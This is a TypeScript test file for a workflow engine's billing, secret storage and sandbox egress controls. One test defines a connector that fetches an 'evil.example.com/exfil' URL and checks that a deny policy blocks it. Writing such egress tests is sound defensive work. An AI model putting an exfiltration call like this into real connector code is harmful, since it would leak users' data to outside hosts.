import { test } from "node:test";
import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { verifyStripeSignature, SignatureError, BillingService } from "../src/billing.ts";
import { TenantStore } from "../src/tenancy.ts";
import { Vault } from "../src/vault.ts";
import { VaultWebhookSecretStore } from "../src/webhook-secret.ts";
import {
  isHostAllowed,
  enforceEgress,
  EgressBlockedError,
  buildEgressResolver,
} from "../src/sandbox.ts";
import { Engine } from "../src/engine.ts";
import { MemoryStore } from "../src/store.ts";
import { ConnectorRegistry } from "../src/connectors/index.ts";
import type { Connector, Workflow } from "../src/types.ts";

// --- Stripe signature --------------------------------------------------------

const SECRET = "whsec_test";
function sign(body: string, t: number, secret = SECRET): string {
  const mac = createHmac("sha256", secret).update(`${t}.${body}`).digest("hex");
  return `t=${t},v1=${mac}`;
}

test("verifyStripeSignature accepts a valid signature within tolerance", () => {
  const body = '{"id":"evt_1"}';
  const now = 1_700_000_000;
  assert.doesNotThrow(() => verifyStripeSignature(body, sign(body, now), SECRET, now));
});

test("verifyStripeSignature rejects tampering, wrong secret, replay, malformed", () => {
  const body = '{"id":"evt_1"}';
  const now = 1_700_000_000;
  assert.throws(() => verifyStripeSignature("tampered", sign(body, now), SECRET, now), SignatureError);
  assert.throws(() => verifyStripeSignature(body, sign(body, now, "other"), SECRET, now), SignatureError);
  assert.throws(() => verifyStripeSignature(body, sign(body, now), SECRET, now + 10_000), SignatureError);
  assert.throws(() => verifyStripeSignature(body, "garbage", SECRET, now), SignatureError);
});

// --- Billing event -> plan ---------------------------------------------------

function billingFixture() {
  const tenants = new TenantStore("", {
    id: "t",
    name: "t",
    plan: "free",
    members: [{ email: "o", role: "owner" }],
  });
  const svc = new BillingService(tenants, SECRET, { priceToPlan: { price_pro: "pro" } });
  return { tenants, svc };
}

test("checkout.session.completed upgrades the plan and links the customer", () => {
  const { tenants, svc } = billingFixture();
  const r = svc.applyEvent({
    id: "evt",
    type: "checkout.session.completed",
    data: { object: { customer: "cus_1", subscription: "sub_1", metadata: { plan: "pro" } } },
  });
  assert.equal(r.applied, true);
  assert.equal(tenants.get().plan, "pro");
  assert.equal(tenants.get().billing?.customerId, "cus_1");
});

test("subscription.updated maps plan from the price; deleted downgrades to free", () => {
  const { tenants, svc } = billingFixture();
  svc.applyEvent({
    id: "e1",
    type: "customer.subscription.updated",
    data: { object: { items: { data: [{ price: { id: "price_pro" } }] }, status: "active" } },
  });
  assert.equal(tenants.get().plan, "pro");
  svc.applyEvent({ id: "e2", type: "customer.subscription.deleted", data: { object: {} } });
  assert.equal(tenants.get().plan, "free");
  assert.equal(tenants.get().billing?.status, "canceled");
});

test("handleWebhook verifies signature then applies", () => {
  const { tenants, svc } = billingFixture();
  const body = JSON.stringify({
    id: "evt",
    type: "checkout.session.completed",
    data: { object: { metadata: { plan: "team" } } },
  });
  const now = 1_700_000_000;
  svc.handleWebhook(body, sign(body, now), now);
  assert.equal(tenants.get().plan, "team");
  assert.throws(() => svc.handleWebhook(body, sign(body, now, "wrong"), now), SignatureError);
});

// --- Vault webhook secrets ---------------------------------------------------

test("vault webhook secrets are encrypted at rest and decrypt round-trip", () => {
  const dir = mkdtempSync(join(tmpdir(), "flowdock-vsec-"));
  const path = join(dir, "webhooks-vault.json");
  const vault = new Vault(Buffer.alloc(32, 9).toString("base64"));
  const tk = vault.createTenantKey();
  try {
    const store = new VaultWebhookSecretStore(vault, tk, path);
    const secret = store.ensure("wf", "supersecretvalue");
    assert.equal(secret, "supersecretvalue");
    // on disk: ciphertext only, never the plaintext
    const onDisk = readFileSync(path, "utf8");
    assert.ok(!onDisk.includes("supersecretvalue"));
    // reopen with same key -> same secret
    assert.equal(new VaultWebhookSecretStore(vault, tk, path).get("wf"), "supersecretvalue");
    // a different tenant key cannot decrypt
    const other = vault.createTenantKey();
    assert.throws(() => new VaultWebhookSecretStore(vault, other, path).get("wf"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// --- Sandbox egress ----------------------------------------------------------

test("isHostAllowed: exact + suffix wildcard, no over-match", () => {
  assert.equal(isHostAllowed("api.x.com", ["api.x.com"]), true);
  assert.equal(isHostAllowed("api.x.com", ["*.x.com"]), true);
  assert.equal(isHostAllowed("x.com", ["*.x.com"]), false); // apex not covered by wildcard
  assert.equal(isHostAllowed("evil-x.com", ["*.x.com"]), false); // not a real subdomain
  assert.equal(isHostAllowed("api.x.com", []), false);
});

test("enforceEgress allows/denies per policy", () => {
  assert.doesNotThrow(() => enforceEgress("https://anything", { mode: "allow" }));
  assert.throws(() => enforceEgress("https://x.com", { mode: "deny" }), EgressBlockedError);
  assert.doesNotThrow(() =>
    enforceEgress("https://api.x.com/v1", { mode: "allowlist", allowedHosts: ["api.x.com"] }),
  );
  assert.throws(
    () => enforceEgress("https://evil.com", { mode: "allowlist", allowedHosts: ["api.x.com"] }),
    EgressBlockedError,
  );
});

test("buildEgressResolver: built-in trusted; unverified sandboxed only in strict mode", () => {
  const community: Connector = {
    id: "ext.api",
    title: "ext",
    manifest: { id: "ext.api", title: "ext", version: "1.0.0", allowedHosts: ["api.ext.com"] },
    async execute() {
      return null;
    },
  };
  const reg = new ConnectorRegistry();
  reg.registerDynamic(community, { verified: false });

  const lax = buildEgressResolver(reg, { strict: false });
  assert.equal(lax("echo").mode, "allow"); // built-in
  assert.equal(lax("ext.api").mode, "allow"); // dev tier: not enforced

  const strict = buildEgressResolver(reg, { strict: true });
  assert.equal(strict("echo").mode, "allow"); // built-in stays trusted
  assert.deepEqual(strict("ext.api"), { mode: "allowlist", allowedHosts: ["api.ext.com"] });

  reg.registerDynamic(
    { id: "bare.api", title: "bare", async execute() { return null; } },
    { verified: false },
  );
  assert.equal(strict("bare.api").mode, "deny"); // declares no hosts -> fail closed
});

test("engine enforces egress: a denied connector cannot reach the network", async () => {
  const netConn: Connector = {
    id: "net.get",
    title: "net",
    async execute(_input, ctx) {
      const res = await ctx.fetch("https://evil.example.com/exfil");
      return { ok: res.ok };
    },
  };
  const engine = new Engine({
    registry: new ConnectorRegistry([netConn]),
    store: new MemoryStore(),
    fetchImpl: async () => new Response("LEAK", { status: 200 }), // must never be reached
    egress: (id) => (id === "net.get" ? { mode: "deny" } : { mode: "allow" }),
  });
  const wf: Workflow = { name: "x", nodes: [{ id: "n", uses: "net.get", retry: { max: 0, backoffMs: 1 } }] };
  const result = await engine.run(wf);
  assert.equal(result.status, "failed");
  assert.match(result.steps[0]!.error!, /not permitted|egress/i);
});

test("engine egress allowlist permits a declared host", async () => {
  const netConn: Connector = {
    id: "net.ok",
    title: "net",
    async execute(_input, ctx) {
      const res = await ctx.fetch("https://api.good.com/v1");
      return { status: res.status };
    },
  };
  const engine = new Engine({
    registry: new ConnectorRegistry([netConn]),
    store: new MemoryStore(),
    fetchImpl: async () => new Response("ok", { status: 200 }),
    egress: () => ({ mode: "allowlist", allowedHosts: ["api.good.com"] }),
  });
  const result = await engine.run({ name: "x", nodes: [{ id: "n", uses: "net.ok" }] });
  assert.equal(result.status, "succeeded");
  assert.equal((result.outputs.n as { status: number }).status, 200);
});
